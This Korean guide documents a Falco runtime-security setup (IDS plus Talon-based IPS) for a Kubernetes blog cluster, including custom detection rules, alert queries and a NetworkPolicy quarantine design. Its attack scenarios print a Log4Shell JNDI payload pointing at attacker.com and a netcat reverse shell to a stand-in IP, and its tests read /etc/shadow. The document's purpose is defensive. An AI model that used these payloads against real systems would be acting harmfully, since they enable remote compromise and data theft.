# Falco 런타임 보안 (IDS + IPS)

> eBPF 기반 컨테이너 런타임 보안 모니터링 + 자동 대응

**설치일**:
- IDS (Falco): 2026-01-22
- IPS (Falco Talon): 2026-01-23

**버전**: Falco 0.42.1 + Falco Talon latest
**모드**: IDS + IPS (Dry-Run Phase 1)

---

## 목차

1. [개요](#개요)
2. [왜 Falco인가?](#왜-falco인가)
3. [아키텍처](#아키텍처)
4. [설치 방법](#설치-방법)
5. [구성 요소](#구성-요소)
6. [리소스 사용량](#리소스-사용량)
7. [탐지 규칙](#탐지-규칙)
8. [알림 설정](#알림-설정)
9. [**실제 사용 방법**](#실제-사용-방법) ⭐ NEW
10. [향후 IPS 활성화](#향후-ips-활성화)
11. [트러블슈팅](#트러블슈팅)

---

## 개요

### Falco란?

**Falco**는 CNCF 졸업 프로젝트로, 컨테이너 런타임에서 이상 행위를 탐지하는 보안 도구입니다.

| 항목 | 값 |
|------|-----|
| **역할** | Runtime Security (IDS) |
| **탐지 방식** | eBPF syscall 모니터링 |
| **Namespace** | falco |
| **설치 방식** | Helm Chart |
| **현재 모드** | IDS + IPS (Dry-Run Phase 1) |

### 현재 상태

```bash
# Pod 상태 확인
kubectl get pods -n falco
```

| Pod | 역할 | 상태 |
|-----|------|------|
| falco-xxxxx (DaemonSet) | 각 노드에서 syscall 모니터링 | Running |
| falco-falcosidekick-xxx | Alert 전송 (Loki, Talon) | Running |
| falco-talon-xxx | 자동 대응 (IPS, Dry-Run) | Running |
| falco-falcosidekick-ui-xxx | 웹 UI | Running |
| falco-falcosidekick-ui-redis-0 | UI용 Redis | Running |

---

## 왜 Falco인가?

### 기존 보안 도구와 차별점

| 보안 계층 | 도구 | 역할 | Falco 차별점 |
|-----------|------|------|-------------|
| **빌드 타임** | Trivy | 이미지 취약점 스캔 | 런타임 행위 탐지 |
| **네트워크** | CiliumNetworkPolicy | L3/L4 트래픽 제어 | syscall 레벨 탐지 |
| **런타임** | **Falco** | 이상 행위 탐지 | ✅ 유일한 런타임 보안 |

### 탐지 예시

```
시나리오: 공격자가 컨테이너에 shell 접근 시도

1. kubectl exec -it pod -- /bin/sh  ← 실행
2. Falco 감지: "Terminal shell in container"
3. Alert → Slack/Loki/Email
4. (IPS 모드 시) Pod 자동 종료
```

### 대안 비교

| 도구 | 장점 | 단점 | 선택 이유 |
|------|------|------|----------|
| **Falco** | CNCF 졸업, 커뮤니티 활발 | 학습 곡선 | ✅ 선택 |
| Sysdig Secure | 상용 지원 | 유료 | ❌ 비용 |
| Tetragon | Cilium 통합 | 신규 프로젝트 | ❌ 안정성 |
| Wazuh | SIEM 통합 | 무거움 (Agent 기반) | ❌ 리소스 |

---

## 아키텍처

### 전체 구조

```
┌─────────────────────────────────────────────────────────────────┐
│                     Kubernetes Cluster                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │                    각 노드 (DaemonSet)                     │  │
│  │                                                            │  │
│  │   ┌──────────┐    eBPF     ┌──────────────────────────┐  │  │
│  │   │ Kernel   │ ──────────→ │ Falco Pod                │  │  │
│  │   │ syscalls │             │  ├─ falco (main)         │  │  │
│  │   └──────────┘             │  └─ falcoctl (sidecar)   │  │  │
│  │                            └───────────┬──────────────┘  │  │
│  │                                        │                   │  │
│  └────────────────────────────────────────│───────────────────┘  │
│                                           │                      │
│                                           ↓                      │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │                    Falcosidekick                            │ │
│  │                                                              │ │
│  │   Alert 수신 → 다양한 목적지로 전송                          │ │
│  │   ├─ Loki (로그 저장)                                       │ │
│  │   ├─ Slack (실시간 알림)                                    │ │
│  │   ├─ Webhook (커스텀)                                       │ │
│  │   └─ Kubernetes API (IPS - Pod 삭제)                        │ │
│  │                                                              │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │                  Falcosidekick UI                           │ │
│  │   - Alert 대시보드                                          │ │
│  │   - 실시간 이벤트 뷰                                        │ │
│  │   - 통계                                                    │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### eBPF 드라이버

**선택: modern_ebpf** (권장)

| 드라이버 | 장점 | 단점 |
|----------|------|------|
| **modern_ebpf** | 커널 모듈 불필요, Cilium과 충돌 없음 | 최신 커널 필요 (5.8+) |
| kmod | 모든 커널 지원 | 커널 모듈 로드 필요, 보안 위험 |
| ebpf (classic) | 넓은 커널 지원 | modern_ebpf보다 성능 낮음 |

**현재 커널**: 6.8.0-90-generic (Ubuntu 22.04) → modern_ebpf 사용 가능

---

## 설치 방법

### 1. Helm Repo 추가

```bash
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update falcosecurity
```

### 2. Values 파일 확인

**파일 위치**: `/home/jimin/k8s-manifests/docs/helm/falco/values.yaml`

**주요 설정**:
```yaml
# Driver (Cilium 충돌 방지)
driver:
  kind: modern_ebpf

# Falcosidekick (Alert 전송)
falcosidekick:
  enabled: true
  webui:
    enabled: true
  config:
    loki:
      hostport: "http://loki-stack.monitoring.svc.cluster.local:3100"
      minimumpriority: "warning"
```

### 3. 설치 명령

```bash
helm install falco falcosecurity/falco \
  -n falco --create-namespace \
  -f /home/jimin/k8s-manifests/docs/helm/falco/values.yaml
```

### 4. 설치 확인

```bash
# Pod 상태
kubectl get pods -n falco -o wide

# 정상 출력:
# NAME                                     READY   STATUS    NODE
# falco-xxxxx                              2/2     Running   k8s-cp
# falco-yyyyy                              2/2     Running   k8s-worker2
# falco-zzzzz                              2/2     Running   k8s-worker3
# falco-falcosidekick-xxx                  1/1     Running   ...
# falco-falcosidekick-ui-xxx               1/1     Running   ...
```

---

## 구성 요소

### 1. Falco DaemonSet

**역할**: 각 노드에서 syscall 모니터링

**컨테이너**:
- `falco`: 메인 프로세스 (syscall 모니터링, 룰 평가)
- `falcoctl`: 룰 자동 업데이트

**리소스**:
```yaml
resources:
  requests:
    cpu: 100m
    memory: 256Mi
  limits:
    cpu: 500m
    memory: 512Mi
```

### 2. Falcosidekick

**역할**: Alert를 다양한 목적지로 전송

**지원 목적지**:
- Loki (현재 활성화)
- Slack
- Discord
- Webhook
- Elasticsearch
- AWS S3
- Kubernetes API (IPS용)

### 3. Falcosidekick UI

**역할**: Alert 시각화 대시보드

**접속 방법**:
```bash
kubectl port-forward -n falco svc/falco-falcosidekick-ui 2802:2802
# 브라우저: http://localhost:2802
```

---

## 리소스 사용량

### 현재 사용량

```bash
kubectl top pods -n falco
```

| Pod | CPU | Memory | 비고 |
|-----|-----|--------|------|
| falco (각 노드) | ~50m | ~200Mi | eBPF 모니터링 |
| falcosidekick | ~10m | ~50Mi | Alert 전송 |
| falcosidekick-ui | ~10m | ~50Mi | 웹 UI |
| redis | ~5m | ~30Mi | UI용 캐시 |

### 총 리소스

| 노드당 | 전체 (4노드) |
|--------|-------------|
| CPU: ~50m | CPU: ~250m |
| Memory: ~200Mi | Memory: ~800Mi |

**평가**: 클러스터 리소스 대비 매우 가벼움 (CPU 1%, Memory 1%)

---

## 탐지 규칙

### 기본 제공 룰 (주요)

| 룰 이름 | 설명 | 우선순위 |
|---------|------|----------|
| Terminal shell in container | 컨테이너 내 shell 실행 | Notice |
| Write below etc | /etc 디렉터리 쓰기 | Error |
| Read sensitive file | /etc/shadow 등 읽기 | Warning |
| Contact K8S API Server | 비인가 API 접근 | Notice |
| Unexpected network connection | 비정상 네트워크 연결 | Notice |
| Package management | apt/yum 실행 | Error |
| Modify binary dirs | /bin, /sbin 수정 | Error |

### 커스텀 룰 (blog-system 특화) ⭐

> 2026-01-23 추가: blog-system namespace 맞춤형 보안 룰 4개

**파일**: `/home/jimin/k8s-manifests/docs/helm/falco/values.yaml` (customRules 섹션)

#### Rule 1: Java Process Spawning Shell (RCE 방어)

**우선순위**: CRITICAL
**목적**: Spring Boot(Java) 프로세스가 shell을 실행하면 RCE 공격 의심
**탐지 시나리오**: Log4Shell, Spring4Shell 같은 취약점 악용

```yaml
- rule: Java Process Spawning Shell
  desc: Detect java process spawning a shell (Likely RCE attack like Log4Shell)
  condition: >
    spawned_process and
    proc.pname exists and
    proc.pname in (java, javac) and
    proc.name in (bash, sh, ksh, zsh, dash) and
    container
  output: >
    🚨 CRITICAL: Java 프로세스가 Shell을 실행했습니다 (RCE 공격 의심!)
    (user=%user.name pod=%k8s.pod.name namespace=%k8s.ns.name
     parent=%proc.pname cmd=%proc.cmdline container=%container.name)
  priority: CRITICAL
  tags: [maturity_stable, host, container, process, mitre_execution, T1059, rce, java]
```

**정상 시나리오**: Java가 shell을 실행할 이유 없음 (0%)
**악의적 시나리오**: 원격 코드 실행 공격

#### Rule 2: Package Manager in Container (Immutability 위반)

**우선순위**: WARNING
**목적**: 운영 중 컨테이너에서 패키지 설치 감지 (불변성 원칙 위반)

```yaml
- rule: Launch Package Management Process in Container
  desc: Package management process ran inside container (Immutability violation)
  condition: >
    spawned_process and
    container and
    proc.name in (apk, apt, apt-get, yum, rpm, dnf, pip, pip3, npm) and
    not proc.pname in (package_mgmt_binaries)
  output: >
    ⚠️ WARNING: 컨테이너 내부에서 패키지 관리자가 실행되었습니다!
    (user=%user.name pod=%k8s.pod.name namespace=%k8s.ns.name
     cmd=%proc.cmdline container=%container.name)
  priority: WARNING
  tags: [maturity_stable, container, process, mitre_execution, T1059]
```

**정상 시나리오**: 빌드 시에만 패키지 설치, 런타임엔 절대 안 함
**악의적 시나리오**: 해커가 공격 도구 설치 (netcat, nmap 등)

**테스트 결과** (2026-01-23):
```bash
# 테스트 명령
kubectl exec -n blog-system web-bdcdfd7bd-n6m64 -- apk update

# Alert 발생 (01:33:17)
⚠️ WARNING: 컨테이너 내부에서 패키지 관리자가 실행되었습니다!
pod=web-bdcdfd7bd-n6m64 namespace=blog-system cmd=apk update
```

#### Rule 3: Write to Binary Directory (Drift Detection)

**우선순위**: ERROR
**목적**: 시스템 디렉토리에 파일 쓰기 시도 감지 (악성코드 설치)

```yaml
- rule: Write to Binary Dir
  desc: Attempt to write to system binary directories
  condition: >
    open_write and
    container and
    (fd.name startswith /bin/ or
     fd.name startswith /usr/bin/ or
     fd.name startswith /sbin/ or
     fd.name startswith /usr/sbin/)
  output: >
    🔴 ERROR: 바이너리 디렉토리에 쓰기 시도 감지!
    (user=%user.name file=%fd.name pod=%k8s.pod.name
     namespace=%k8s.ns.name cmd=%proc.cmdline container=%container.name)
  priority: ERROR
  tags: [maturity_stable, container, filesystem, mitre_persistence, T1543]
```

**정상 시나리오**: /bin, /usr/bin, /sbin은 읽기 전용
**악의적 시나리오**: 백도어 바이너리 설치, rootkit 설치

#### Rule 4: Unexpected Outbound Connection (Reverse Shell 방어)

**우선순위**: NOTICE
**목적**: 예상치 못한 외부 연결 감지 (C&C 서버 통신, 데이터 유출)

```yaml
- rule: Unexpected Outbound Connection
  desc: Detect outbound connections to uncommon ports (potential C&C or reverse shell)
  condition: >
    outbound and
    container and
    fd.type in (ipv4, ipv6) and
    not fd.lport in (80, 443, 8080, 3306, 53) and
    not fd.sip in ("127.0.0.1", "::1") and
    not proc.name in (curl, wget, git)
  output: >
    🔵 NOTICE: 예상치 못한 외부 연결 시도 감지
    (connection=%fd.name lport=%fd.lport rport=%fd.rport
     pod=%k8s.pod.name namespace=%k8s.ns.name
     cmd=%proc.cmdline container=%container.name)
  priority: NOTICE
  tags: [maturity_incubating, container, network, mitre_exfiltration, T1041]
```

**정상 시나리오**: DB(3306), 내부 API(8080), HTTPS(443) 연결
**악의적 시나리오**: 해커 C&C 서버로 역쉘 연결 (nc -e /bin/sh 1.2.3.4 4444)

**주의**: 노이즈가 많을 수 있으니 초기엔 NOTICE로 설정, 튜닝 필요

---

## 알림 설정

### Loki 연동 (현재 활성화)

**설정**:
```yaml
config:
  loki:
    hostport: "http://loki-stack.monitoring.svc.cluster.local:3100"
    minimumpriority: "warning"
```

**Grafana에서 조회**:
```
{job="falco"} | json
```

### Slack 연동 (선택)

```yaml
config:
  slack:
    webhookurl: "https://hooks.slack.com/services/XXX/YYY/ZZZ"
    minimumpriority: "warning"
    outputformat: "all"
```

---

## 실제 사용 방법

> ⭐ 이 섹션은 실제 테스트 결과를 바탕으로 작성되었습니다 (2026-01-22)

### Alert 확인 방법

#### 방법 1: Grafana + Loki (권장)

```bash
# Grafana Explore에서 Loki 쿼리
{priority="Warning"}

# 특정 룰만 조회
{rule="Read sensitive file untrusted"}

# 특정 namespace만 조회
{k8s_ns_name="blog-system"}
```

**쿼리 예시 (CLI)**:
```bash
# Loki 포트포워딩
kubectl port-forward -n monitoring svc/loki-stack 3100:3100 &

# Alert 조회 (최근 30분)
curl -s -G "http://localhost:3100/loki/api/v1/query_range" \
  --data-urlencode 'query={priority="Warning"}' \
  --data-urlencode "start=$(date -d '30 minutes ago' +%s)000000000" \
  --data-urlencode "end=$(date +%s)000000000" \
  --data-urlencode 'limit=10'
```

#### 방법 2: Falcosidekick UI

```bash
kubectl port-forward -n falco svc/falco-falcosidekick-ui 2802:2802
# 브라우저: http://localhost:2802
```

#### 방법 3: kubectl 로그

```bash
# Falcosidekick 로그 (Alert 수신 확인)
kubectl logs -n falco deploy/falco-falcosidekick --tail=20

# 정상 출력 예시:
# [INFO]  : Loki - POST OK (204)
# [INFO]  : WebUI - POST OK (200)
```

---

### 탐지 테스트 방법

#### 테스트 1: 민감 파일 읽기 (권장)

```bash
# /etc/shadow 읽기 → "Read sensitive file untrusted" 룰 트리거
kubectl exec -n blog-system $(kubectl get pod -l app=web -o name | head -1) \
  -- cat /etc/shadow
```

**예상 결과**:
```
🚨 [Warning] Read sensitive file untrusted

📍 위치:
   - k8s_ns_name: blog-system
   - k8s_pod_name: web-xxxxx
   - container_name: nginx

🔍 상세:
   - file: /etc/shadow
   - command: cat /etc/shadow
   - user: root
```

#### 테스트 2: 패키지 관리자 실행

```bash
# apk update 실행 → "Launch Package Management Process" 룰 트리거 (있다면)
kubectl exec -n blog-system $(kubectl get pod -l app=web -o name | head -1) \
  -- apk update
```

#### 테스트 3: Shell 실행 (TTY 주의!)

```bash
# ❌ 이렇게 하면 탐지 안 됨 (TTY 없음)
kubectl exec $(kubectl get pod -l app=web -o name | head -1) -n blog-system \
  -- /bin/sh -c "echo test"

# ✅ 이렇게 해야 탐지됨 (TTY 할당)
kubectl exec -it $(kubectl get pod -l app=web -o name | head -1) -n blog-system \
  -- /bin/sh
```

**왜?** "Terminal shell in container" 룰의 조건:
```yaml
condition: >
  spawned_process
  and container
  and shell_procs
  and proc.tty != 0      # ← TTY가 할당되어야 함!
  and container_entrypoint
```

---

### 실제 탐지 예시 (2026-01-22 테스트)

```
⏰ 시간: 15:18:15.912267839
🚨 룰:  Read sensitive file untrusted
📊 우선순위: Warning

📝 메시지:
Sensitive file opened for reading by non-trusted program

🔍 상세 정보:
├── file: /etc/shadow
├── process: cat
├── command: cat /etc/shadow
├── user: root
├── container_name: nginx
├── container_image: ghcr.io/wlals2/blog-web:v48
├── k8s_pod_name: web-db54c48f5-c6qx8
└── k8s_ns_name: blog-system
```

---

### Alert 대응 워크플로우

```
┌─────────────────────────────────────────────────────────────────┐
│                    IDS 모드 (현재 설정)                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. Falco가 이상 행위 탐지 (syscall 모니터링)                    │
│     ↓                                                            │
│  2. Falcosidekick이 Loki로 전송                                  │
│     ↓                                                            │
│  3. Grafana 대시보드에서 확인                                    │
│     ↓                                                            │
│  4. 수동으로 조사 및 대응                                        │
│     - kubectl describe pod                                       │
│     - kubectl logs                                               │
│     - 필요 시 Pod 삭제                                           │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                    IPS 모드 (향후 활성화)                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. Falco가 Critical 이상 행위 탐지                              │
│     ↓                                                            │
│  2. Falcosidekick이 자동으로 Pod 종료                            │
│     ↓                                                            │
│  3. Slack/Email 알림 전송                                        │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

### Loki 라벨 구조

Falcosidekick이 Loki로 전송할 때 사용하는 라벨:

| 라벨 | 설명 | 예시 값 |
|------|------|---------|
| `priority` | Alert 우선순위 | Warning, Error, Critical |
| `rule` | 탐지 룰 이름 | Read sensitive file untrusted |
| `source` | 이벤트 소스 | syscall |
| `hostname` | 노드 이름 | k8s-worker1 |
| `k8s_ns_name` | Namespace | blog-system |
| `k8s_pod_name` | Pod 이름 | web-xxxxx |
| `tags` | MITRE ATT&CK 태그 | T1555, container, filesystem |

**Grafana 쿼리 예시**:
```
# 모든 Warning 이상 Alert
{priority=~"Warning|Error|Critical"}

# blog-system namespace만
{k8s_ns_name="blog-system"}

# 특정 룰만
{rule="Terminal shell in container"}
```

---

## Falcosidekick UI 접속

> 2026-01-23 추가: Ingress를 통한 웹 UI 접속 설정

### Ingress 설정

**파일**: `/home/jimin/k8s-manifests/falco/falcosidekick-ui-ingress.yaml`

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: falcosidekick-ui-ingress
  namespace: falco
  annotations:
    nginx.ingress.kubernetes.io/whitelist-source-range: "192.168.X.0/24"  # 내부 네트워크 대역
    nginx.ingress.kubernetes.io/enable-real-ip: "true"
    nginx.ingress.kubernetes.io/use-forwarded-headers: "true"
spec:
  ingressClassName: nginx
  rules:
  - host: falco.jiminhome.shop
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: falco-falcosidekick-ui
            port:
              number: 2802
```

**적용**:
```bash
kubectl apply -f /home/jimin/k8s-manifests/falco/falcosidekick-ui-ingress.yaml
```

### 접속 방법

#### 방법 1: Ingress를 통한 접속 (권장)

**URL**: http://falco.jiminhome.shop

**Windows hosts 파일 설정** (`C:\Windows\System32\drivers\etc\hosts`):
```
192.168.X.200 falco.jiminhome.shop  # MetalLB LoadBalancer IP
```

**인증 정보**:
- 기본 인증: Helm Chart 기본값 사용 (admin/admin)
- 필요 시 values.yaml에서 변경 가능

**보안**:
- IP 화이트리스트: `192.168.X.0/24` (내부 네트워크만 접근 가능)
- 외부 IP는 `403 Forbidden` 차단

#### 방법 2: Port-forward (임시 접속)

```bash
kubectl port-forward -n falco svc/falco-falcosidekick-ui 2802:2802
# 브라우저: http://localhost:2802
```

### UI 기능

**DASHBOARD 탭**:
- Alert 통계 그래프
- Priority별 분포 (CRITICAL/WARNING/ERROR)
- Rule별 Top 10
- 시간대별 트렌드

**EVENTS 탭**:
- 실시간 Alert 목록
- 필터링 (Priority, Rule, Hostname)
- 검색 기능
- 상세 정보 확인 (클릭)

**INFO 탭**:
- Falcosidekick 설정 확인
- 출력 목적지 (Loki, Slack 등)
- 버전 정보

### UI 필터 사용 예시

**특정 Priority만 보기**:
```
Priorities → Critical, Error, Warning 선택
```

**특정 Pod만 보기**:
```
Tags → k8s.pod.name → web-xxxxx 선택
```

**최근 1시간만 보기**:
```
Since → 1h 선택
```

---

## IPS 활성화 완료 (Dry-Run Phase 1) 🆕

> ⭐ **핵심 개념**: Pod 즉시 삭제 대신 **NetworkPolicy 기반 격리** 방식 채택
> **현재 상태**: Falco Talon 설치 완료, Dry-Run 모드 운영 중 (2026-01-23~)

### IDS vs IPS

| 모드 | 역할 | 동작 방식 | 현재 상태 |
|------|------|----------|----------|
| **IDS** | 탐지만 (Detection) | CCTV처럼 기록, 알림만 | ✅ 활성화 |
| **IPS** | 탐지 + 차단 (Prevention) | NetworkPolicy로 자동 격리 | ✅ Dry-Run (Phase 1) |

**현재 시스템 비유**:
- **IDS 모드 (운영 중)**: CCTV + 경보기 - 침입자 발견 시 관리자에게 알림
- **IPS 모드 (Dry-Run)**: 자동 방범 시스템 - 침입자 발견 시 자동 격리 (학습 단계)

---

## IPS 구현 완료 (구현 상세)

### 1. Pod Isolation vs Pod Termination 비교

| 방식 | 동작 | 장점 | 단점 | 선택 |
|------|------|------|------|------|
| **Pod Isolation** | NetworkPolicy로 네트워크 격리 | 증거 보존<br>서비스 유지<br>False Positive 대응 가능 | 완전 차단 아님<br>Pod는 계속 실행 | ✅ **채택** |
| **Pod Termination** | 즉시 Pod 삭제 | 완전 차단<br>간단함 | 증거 손실<br>서비스 중단<br>False Positive 시 복구 어려움 | ❌ 위험 |

#### 왜 Pod Isolation을 선택했는가?

**시나리오: Java RCE 공격 탐지**

##### ❌ Pod Termination 방식
```
1. Falco가 "Java Process Spawning Shell" 탐지 (CRITICAL)
2. Falcosidekick이 즉시 Pod 삭제
   → kubectl delete pod was-xxxxx
3. 결과:
   ✅ 공격 차단 성공
   ❌ WAS 서비스 중단 (새 Pod 시작까지 10-30초)
   ❌ False Positive인 경우 불필요한 서비스 중단
   ❌ 포렌식 증거 손실 (로그, 메모리 덤프 불가)
   ❌ 사용자 영향: 일부 요청 실패
```

##### ✅ Pod Isolation 방식 (채택)
```
1. Falco가 "Java Process Spawning Shell" 탐지 (CRITICAL)
2. Falcosidekick이 NetworkPolicy 적용
   → Pod의 모든 Ingress/Egress 차단
3. 결과:
   ✅ 외부 통신 차단 (C&C 서버, 데이터 유출 방지)
   ✅ Pod 유지 → 포렌식 조사 가능
   ✅ 내부 트래픽 허용 가능 (선택적)
   ✅ False Positive 확인 후 격리 해제 가능
   ⚠️ Pod 자체는 계속 실행 (CPU/Memory 사용)
```

**트레이드오프 판단**:
- **운영 환경**: Pod 삭제는 너무 위험 (서비스 중단)
- **포렌식 중요**: 공격 분석을 위해 증거 보존 필요
- **False Positive**: BuildKit, 정상 패키지 설치 등 오탐 가능성

---

### 2. Falco Response Engine 선택

| 도구 | 역할 | 기능 | 선택 |
|------|------|------|------|
| **Falco Talon** | CNCF 공식 Response Engine | NetworkPolicy 생성<br>Pod 격리<br>Webhook 호출<br>람다 실행 | ✅ **권장** |
| Falcosidekick Kubernetes Output | 간단한 Pod 삭제 | Pod 삭제만 가능 | ❌ 기능 부족 |
| Kubewarden | 정책 엔진 (별도 프로젝트) | 복잡한 정책 가능 | ❌ Over-engineering |

**선택: Falco Talon**
- 공식 CNCF 프로젝트
- NetworkPolicy 생성 기능 내장
- 람다식 기반 유연한 대응 정책
- Kubernetes RBAC 통합

---

### 3. NetworkPolicy 기반 격리 구현

#### 격리 정책 설계

**목표**: 의심스러운 Pod를 자동으로 네트워크 격리

```yaml
# Falco Talon이 자동 생성할 NetworkPolicy
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: quarantine-<pod-name>
  namespace: blog-system
  labels:
    falco-response: "quarantine"
    created-by: "falco-talon"
spec:
  podSelector:
    matchLabels:
      app: was  # 격리 대상 Pod
      quarantine: "true"  # Talon이 자동으로 라벨 추가
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          name: monitoring  # Grafana에서 조사 가능
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          name: kube-system  # DNS만 허용
    ports:
    - protocol: UDP
      port: 53
```

**격리 효과**:
- ✅ **Egress 차단**: C&C 서버 통신 불가, 데이터 유출 방지
- ✅ **Ingress 차단**: 추가 공격 벡터 차단
- ✅ **DNS 허용**: Pod가 정상 종료될 수 있도록
- ✅ **Monitoring 허용**: Prometheus, Grafana에서 조사 가능

---

### 4. Falco Talon 설치 완료 ✅

**설치일**: 2026-01-23
**상태**: Running (Dry-Run Mode)

#### 4-1. Helm 설치 (완료)

```bash
# Helm Repo 추가
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update

# Falco Talon 설치 (완료)
helm install falco-talon falcosecurity/falco-talon \
  -n falco \
  -f /home/jimin/k8s-manifests/docs/helm/falco/talon-values.yaml

# 설치 확인
kubectl get pods -n falco -l app.kubernetes.io/name=falco-talon
```

#### 4-2. Talon Values 파일

**파일**: `/home/jimin/k8s-manifests/docs/helm/falco/talon-values.yaml`

```yaml
# Falco Talon 설정
replicaCount: 1

# Falco와 연동
config:
  # Falco에서 Alert 수신
  listenAddress: 0.0.0.0
  listenPort: 2803

  # 기본 동작 모드
  defaultActions:
    - kubernetes:networkpolicy  # NetworkPolicy 생성
    - kubernetes:label          # Pod에 라벨 추가
    - notification:slack        # Slack 알림

  # 규칙 정의
  rules:
    # Rule 1: Java RCE 공격 격리
    - name: isolate-rce-attack
      match:
        rules:
          - Java Process Spawning Shell
        priority: CRITICAL
      actions:
        # 1. Pod에 quarantine 라벨 추가
        - action: kubernetes:label
          parameters:
            labels:
              quarantine: "true"
              falco-response: "isolated"
              isolated-at: "{{ .Time }}"

        # 2. NetworkPolicy 생성하여 격리
        - action: kubernetes:networkpolicy
          parameters:
            allow_dns: true
            allow_monitoring: true
            deny_all_ingress: true
            deny_all_egress: true

        # 3. Slack 알림
        - action: notification:slack
          parameters:
            webhook_url: "${SLACK_WEBHOOK}"
            message: |
              🚨 **CRITICAL: RCE 공격 탐지 및 자동 격리**

              Pod: {{ .Output.Fields.k8s_pod_name }}
              Namespace: {{ .Output.Fields.k8s_ns_name }}
              Command: {{ .Output.Fields.proc_cmdline }}

              **조치**: NetworkPolicy 적용하여 네트워크 격리 완료
              **다음 단계**: kubectl logs 및 kubectl exec 를 통해 포렌식 조사

    # Rule 2: 패키지 관리자 실행 (경고만)
    - name: alert-package-manager
      match:
        rules:
          - Launch Package Management Process in Container
        priority: WARNING
      actions:
        # 격리 없이 Slack 알림만
        - action: notification:slack
          parameters:
            webhook_url: "${SLACK_WEBHOOK}"
            message: |
              ⚠️ WARNING: 패키지 관리자 실행 감지

              Pod: {{ .Output.Fields.k8s_pod_name }}
              Command: {{ .Output.Fields.proc_cmdline }}

              **판단 필요**: 정상 작업인지 확인 필요

# RBAC 설정
rbac:
  create: true
  rules:
    # NetworkPolicy 생성 권한
    - apiGroups: ["networking.k8s.io"]
      resources: ["networkpolicies"]
      verbs: ["create", "get", "list", "delete"]

    # Pod 라벨 수정 권한
    - apiGroups: [""]
      resources: ["pods"]
      verbs: ["get", "list", "patch"]

    # Pod 삭제 권한 (비활성화)
    # - apiGroups: [""]
    #   resources: ["pods"]
    #   verbs: ["delete"]

# 리소스
resources:
  requests:
    cpu: 50m
    memory: 128Mi
  limits:
    cpu: 200m
    memory: 256Mi
```

#### 4-3. Falcosidekick 연동

**기존 Falco values.yaml 수정**:

```yaml
falcosidekick:
  enabled: true
  config:
    # Loki (기존 유지)
    loki:
      hostport: "http://loki-stack.monitoring.svc.cluster.local:3100"
      minimumpriority: "warning"

    # Falco Talon에 Alert 전송
    talon:
      address: "http://falco-talon.falco.svc.cluster.local:2803"
      minimumpriority: "warning"  # WARNING 이상만 Talon으로 전송
```

---

### 5. 자동 대응 워크플로우

#### IPS 모드 (Falco Talon 활성화 후)

```
┌─────────────────────────────────────────────────────────────────┐
│                    자동 격리 워크플로우                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. Falco가 CRITICAL Alert 탐지                                  │
│     - Java Process Spawning Shell                                │
│     - Write to Binary Directory                                  │
│     ↓                                                            │
│  2. Falcosidekick이 Falco Talon에 Alert 전송                    │
│     ↓                                                            │
│  3. Falco Talon 자동 대응 (5초 이내)                             │
│     ├─ Pod에 "quarantine=true" 라벨 추가                        │
│     ├─ NetworkPolicy 생성 (모든 트래픽 차단)                     │
│     └─ Slack 알림 전송                                           │
│     ↓                                                            │
│  4. 운영자 조사                                                  │
│     ├─ kubectl logs <pod> -n blog-system                         │
│     ├─ kubectl exec -it <pod> -- /bin/sh                         │
│     └─ 포렌식 도구 사용 (메모리 덤프 등)                         │
│     ↓                                                            │
│  5. 판단 및 조치                                                 │
│     ├─ False Positive → 격리 해제                               │
│     │   kubectl delete networkpolicy quarantine-<pod>            │
│     │   kubectl label pod <pod> quarantine-                      │
│     │                                                             │
│     └─ 실제 공격 → Pod 삭제 및 분석                             │
│         kubectl delete pod <pod> -n blog-system                  │
│         보안 사고 보고서 작성                                    │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

### 6. 실제 시나리오

#### 시나리오 1: Log4Shell RCE 공격

**공격 과정**:
```
1. 공격자가 악의적 JNDI 페이로드 전송
   POST /api/posts HTTP/1.1
   Content-Type: application/json
   {"title": "${jndi:ldap://attacker.com/a}"}

2. Log4j 취약점으로 원격 코드 실행
   → Java 프로세스가 /bin/sh 실행

3. Reverse Shell 시도
   → /bin/sh -c "nc -e /bin/sh 1.2.3.4 4444"
```

**IDS 모드 (현재)**:
```
✅ Falco 탐지: "Java Process Spawning Shell" (CRITICAL)
📩 Slack 알림: "Java가 Shell을 실행했습니다!"
⏱️ 운영자 확인까지: 5분 ~ 1시간
🚨 이 사이 공격자는 계속 활동 가능
   - 내부 네트워크 스캔
   - 다른 서비스 공격
   - 데이터 유출
```

**IPS 모드 (Talon 활성화 시)**:
```
✅ Falco 탐지: "Java Process Spawning Shell" (CRITICAL)
⚡ Talon 자동 대응 (5초):
   1. Pod에 "quarantine=true" 라벨
   2. NetworkPolicy 생성
      → Egress: 모두 차단 (C&C 서버 통신 불가)
      → Ingress: 모두 차단 (추가 공격 불가)
   3. Slack 알림 + 포렌식 가이드
📊 효과:
   ✅ C&C 서버 통신 차단 → Reverse Shell 실패
   ✅ 내부 네트워크 스캔 불가
   ✅ 데이터 유출 방지
   ✅ Pod 유지 → 로그 분석 가능
```

**개선 효과**: 5분 → 5초 (99% 단축)

---

#### 시나리오 2: False Positive (정상 작업)

**상황**: 운영자가 긴급 패치를 위해 컨테이너에서 패키지 설치

```bash
kubectl exec -it was-xxxxx -n blog-system -- apk add curl
```

**IDS 모드 (현재)**:
```
⚠️ Falco 탐지: "Launch Package Management Process" (WARNING)
📩 Slack 알림: "패키지 관리자 실행됨"
✅ 운영자 확인: "내가 한 작업이야"
